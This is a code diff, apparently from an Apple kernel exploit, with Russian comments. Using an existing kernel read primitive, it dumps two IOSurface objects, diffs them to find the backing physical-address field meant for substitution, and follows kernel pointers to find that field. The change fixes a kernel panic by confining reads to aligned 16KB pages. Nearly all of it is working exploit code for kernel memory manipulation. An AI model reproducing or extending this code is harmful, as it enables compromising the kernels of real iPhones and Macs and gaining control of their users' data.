@@ -5770,53 +5770,64 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
 
     // 3. dump both and diff: find the backing PA field = PA-shaped value
     //    that differs between two identical-layout surfaces.
-    uint8_t dSrc[0x200], dDst[0x200];
-    memset(dSrc, 0, sizeof(dSrc));
-    memset(dDst, 0, sizeof(dDst));
-    // object base may be a bit before the ID field; read a window around it
-    uint64_t readBaseDst = surfObjVA > 0x100 ? surfObjVA - 0x100 : surfObjVA;
-    uint64_t readBaseSrc = srcObjVA > 0x100 ? srcObjVA - 0x100 : srcObjVA;
-    if (!kpRead(readBaseDst, dDst, sizeof(dDst), "dst obj dump", r)) { free(ctl); return r; }
-    if (!kpRead(readBaseSrc, dSrc, sizeof(dSrc), "src obj dump", r)) { free(ctl); return r; }
-    int hitOff = -1;
+    // 1.9.102 (паника 080026): readBase=objVA-0x100 нырнул в СОСЕДНЮЮ страницу
+    // physmap — read-protected тип убил ядро. Читаем ТОЛЬКО выровненные
+    // страницы объектов; diff-окна выравниваем по ID-полю (layout одинаковый).
+    uint8_t pgD[0x4000], pgS[0x4000];
+    memset(pgD, 0, sizeof(pgD));
+    memset(pgS, 0, sizeof(pgS));
+    uint64_t pageD = surfObjVA & ~0x3FFFULL;
+    uint64_t pageS = srcObjVA & ~0x3FFFULL;
+    if (!kpRead(pageD, pgD, sizeof(pgD), "dst obj page", r)) { free(ctl); return r; }
+    if (!kpRead(pageS, pgS, sizeof(pgS), "src obj page", r)) { free(ctl); return r; }
+    uint32_t idOffD = (uint32_t)(surfObjVA - pageD);
+    uint32_t idOffS = (uint32_t)(srcObjVA - pageS);
+    int hitOff = -1;   // смещение относительно ID-поля (может быть отрицательным)
     uint64_t hitVA = 0, srcPAval = 0, dstPAval = 0;
-    for (uint32_t o = 0; o + 8 <= sizeof(dDst); o += 8) {
+    for (int k = -0x100; k + 8 <= 0x300; k += 8) {
+        int oD = (int)idOffD + k, oS = (int)idOffS + k;
+        if (oD < 0 || oS < 0 || oD + 8 > 0x4000 || oS + 8 > 0x4000) continue;
         uint64_t qd = 0, qs = 0;
-        memcpy(&qd, dDst + o, 8);
-        memcpy(&qs, dSrc + o, 8);
+        memcpy(&qd, pgD + oD, 8);
+        memcpy(&qs, pgS + oS, 8);
         if (qd == qs) continue;
         BOOL dstPa = (qd > 0x10000000000ULL && qd < 0x20000000000ULL);
         BOOL srcPa = (qs > 0x10000000000ULL && qs < 0x20000000000ULL);
         if (dstPa && srcPa) {
-            kpNote(r, [NSString stringWithFormat:@"  diff +%#x: dst=%#llx src=%#llx ← кандидат backing PA", o,
+            kpNote(r, [NSString stringWithFormat:@"  diff ID%+#x: dst=%#llx src=%#llx ← кандидат backing PA", k,
                       (unsigned long long)qd, (unsigned long long)qs]);
-            if (hitOff < 0) { hitOff = (int)o; hitVA = readBaseDst + o; dstPAval = qd; srcPAval = qs; }
+            if (hitOff < 0) { hitOff = k; hitVA = surfObjVA + k; dstPAval = qd; srcPAval = qs; }
         }
     }
 
     if (hitOff >= 0) {
-        kpNote(r, [NSString stringWithFormat:@"  backing PA выбран @ %#llx (+%#x, dst=%#llx src=%#llx) — это и есть поле подмены",
+        kpNote(r, [NSString stringWithFormat:@"  backing PA выбран @ %#llx (ID%+#x, dst=%#llx src=%#llx) — это и есть поле подмены",
                   (unsigned long long)hitVA, hitOff, (unsigned long long)dstPAval, (unsigned long long)srcPAval]);
     } else {
         // the dst record IS the IOSurface object (width/BPR/'BGRA'/allocSize/
         // ID all present). Backing lives in a linked IOMemoryDescriptor —
-        // follow every kernel-pointer field of dDst one level and hunt a
-        // PA-shaped value (0x100xxxxxxxx).
-        kpNote(r, @"  dDst = сам IOSurface объект (поля сошлись). Иду по его указателям (lvl2) за backing:");
-        for (uint32_t o = 0; o + 8 <= sizeof(dDst) && hitOff < 0; o += 8) {
+        // follow every kernel-pointer field of the window one level and hunt a
+        // PA-shaped value (0x100xxxxxxxx). Чтения pointee клампимся страницей.
+        kpNote(r, @"  diff пуст — иду по указателям dst-объекта (lvl2) за backing:");
+        for (int k = -0x100; k + 8 <= 0x300 && hitOff < 0; k += 8) {
+            int oD = (int)idOffD + k;
+            if (oD < 0 || oD + 8 > 0x4000) continue;
             uint64_t q = 0;
-            memcpy(&q, dDst + o, 8);
+            memcpy(&q, pgD + oD, 8);
             uint64_t u = kp_untag_ptr(q);
             if (!kpLooksLikeKernelPointer(u)) continue;
             uint8_t d2[0x100];
             memset(d2, 0, sizeof(d2));
-            if (!kpRead(u, d2, sizeof(d2), "lvl2 dump", r)) continue;
-            for (uint32_t o2 = 0; o2 + 8 <= sizeof(d2); o2 += 8) {
+            uint64_t pageEnd = (u & ~0x3FFFULL) + 0x4000;
+            uint32_t sz2 = (u + sizeof(d2) <= pageEnd) ? (uint32_t)sizeof(d2) : (uint32_t)(pageEnd - u);
+            if (sz2 < 8) continue;
+            if (!kpRead(u, d2, sz2, "lvl2 dump", r)) continue;
+            for (uint32_t o2 = 0; o2 + 8 <= sz2; o2 += 8) {
                 uint64_t q2 = 0;
                 memcpy(&q2, d2 + o2, 8);
                 if (q2 > 0x10000000000ULL && q2 < 0x20000000000ULL) {
-                    kpNote(r, [NSString stringWithFormat:@"    lvl2 [dDst+%#x → %#llx] +0x%02x: %#018llx ← кандидат backing PA",
-                              o, (unsigned long long)u, o2, (unsigned long long)q2]);
+                    kpNote(r, [NSString stringWithFormat:@"    lvl2 [dst ID%+#x → %#llx] +0x%02x: %#018llx ← кандидат backing PA",
+                              k, (unsigned long long)u, o2, (unsigned long long)q2]);
                     if (hitOff < 0) { hitOff = (int)o2; hitVA = u + o2; dstPAval = q2; }
                 }
             }
